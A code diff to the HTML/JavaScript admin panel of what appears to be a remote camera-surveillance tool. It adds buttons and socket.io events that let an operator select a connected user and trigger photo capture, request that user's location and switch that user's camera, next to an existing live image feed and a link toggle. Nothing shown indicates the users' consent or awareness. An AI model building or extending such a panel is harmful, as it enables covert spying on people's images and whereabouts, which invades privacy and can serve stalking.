@@ -26,8 +26,10 @@ button {
     color: white;
 }
 button:hover { opacity: 0.9; }
+button:disabled { opacity: 0.5; cursor: not-allowed; }
 button.danger { background: #e74c3c; }
 button.success { background: #27ae60; }
+button.switch { background: #8e44ad; }
 button.gray { background: #555; }
 .status { font-weight: bold; }
 .users { display: grid; gap: 10px; }
@@ -85,11 +87,15 @@ input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 6px; border: 
     </div>
 
     <div class="panel">
-        <h2>Live Feed</h2>
+        <h2>Live Feed & Actions</h2>
         <p id="selectedUser">No user selected.</p>
         <img id="liveImage" class="live" style="display:none;">
         <br>
-        <button id="captureButton" onclick="captureSelectedUser()" disabled>Capture Photo</button>
+        <div class="controls" style="justify-content: center; margin-top: 10px;">
+            <button id="captureButton" onclick="captureSelectedUser()" disabled>Capture Photo</button>
+            <button id="locButton" class="success" onclick="requestUserLocation()" disabled>📍 Request Location</button>
+            <button id="switchCamButton" class="switch" onclick="switchUserCamera()" disabled>🔄 Switch Camera</button>
+        </div>
     </div>
 
     <div class="panel">
@@ -189,6 +195,8 @@ function renderUsers(users) {
         container.textContent = "No active users.";
         selectedSocketId = null;
         document.getElementById("captureButton").disabled = true;
+        document.getElementById("locButton").disabled = true;
+        document.getElementById("switchCamButton").disabled = true;
         document.getElementById("liveImage").style.display = "none";
         return;
     }
@@ -225,6 +233,8 @@ function renderUsers(users) {
         selectedSocketId = null;
         document.getElementById("selectedUser").textContent = "Selected user disconnected.";
         document.getElementById("captureButton").disabled = true;
+        document.getElementById("locButton").disabled = true;
+        document.getElementById("switchCamButton").disabled = true;
         document.getElementById("liveImage").style.display = "none";
     }
 }
@@ -233,12 +243,24 @@ function selectUser(id, name) {
     selectedSocketId = id;
     document.getElementById("selectedUser").textContent = `Viewing: ${name} (${id.substring(0, 8)})`;
     document.getElementById("captureButton").disabled = false;
+    document.getElementById("locButton").disabled = false;
+    document.getElementById("switchCamButton").disabled = false;
     socket.emit("admin-select-user", id);
 }
 
 function captureSelectedUser() {
     if (!selectedSocketId) return;
     socket.emit("admin-trigger-capture", selectedSocketId);
+}
+
+function requestUserLocation() {
+    if (!selectedSocketId) return;
+    socket.emit("admin-request-location", selectedSocketId);
+}
+
+function switchUserCamera() {
+    if (!selectedSocketId) return;
+    socket.emit("admin-switch-camera", selectedSocketId);
 }
 
 async function toggleLink() {
